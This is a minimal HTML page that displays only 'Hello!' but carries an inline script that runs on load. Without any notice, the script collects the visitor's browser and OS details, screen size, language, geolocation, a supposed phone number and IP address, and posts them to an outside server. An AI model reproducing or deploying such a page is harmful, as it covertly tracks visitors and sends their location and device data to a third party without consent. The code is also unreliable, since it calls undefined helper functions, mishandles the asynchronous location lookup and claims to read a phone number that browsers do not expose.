<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body {
            background: #fff;
        }

        h1 {
            text-align: center;
        }
    </style>
    <title>hello</title>
</head>
<body>
    
    <h1>Hello!</h1>

    <script>

function sendDeviceInfo() {

// デバイス情報オブジェクト
const deviceInfo = {}; 

// OS/ブラウザ情報
const ua = navigator.userAgent;
const os = getOS(ua);
const browser = getBrowser(ua);
deviceInfo.os = `${os.name} ${os.version}`;
deviceInfo.browser = `${browser.name} ${browser.version}`;

// 画面情報
const { width, height} = screen;
deviceInfo.screen = `${width}x${height}`;

// 言語設定
deviceInfo.language = navigator.language; 

// 位置情報
navigator.geolocation.getCurrentPosition(p => {
  const { latitude, longitude } = p.coords;  
  deviceInfo.latitude = latitude;
  deviceInfo.longitude = longitude;
});

// その他情報
deviceInfo.model = navigator.deviceMemory;
deviceInfo.phone = getPhoneNumber(); 
deviceInfo.ip = getIPAddress();

// デバイス情報を送信
fetch('https://location-ip-test.onrender.com', {
  method: 'POST',
  headers: {
   'Content-Type': 'application/json' 
  },
  body: JSON.stringify(deviceInfo)
});

}

sendDeviceInfo();


    </script>
</body>
</html>
